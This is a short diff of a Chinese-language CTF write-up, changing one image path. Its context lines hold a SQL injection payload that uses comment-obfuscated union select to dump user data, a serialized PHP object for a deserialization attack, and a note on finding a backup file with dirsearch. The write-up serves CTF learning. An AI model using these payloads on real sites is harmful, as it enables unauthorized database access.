@@ -28,7 +28,7 @@ no=0/**/union/**/select 1,group_concat(data),3,4 from users#  //爆出data的值
 O:8:"UserInfo":3:{s:4:"name";s:3:"123";s:3:"age";i:1;s:4:"blog";s:9:"1.1.1.com";}
 ```
 
-同时使用dirsearch扫描目录发现`user.php.bak`![](/assets/捕鱼.png)下载`user.php.bak`发现定义可反序列化类UserInfo
+同时使用dirsearch扫描目录发现`user.php.bak`![](C:\Gitbook\Import\heart1ess_s_ctf\assets\捕鱼.png)下载`user.php.bak`发现定义可反序列化类UserInfo
 
 ```
 class UserInfo
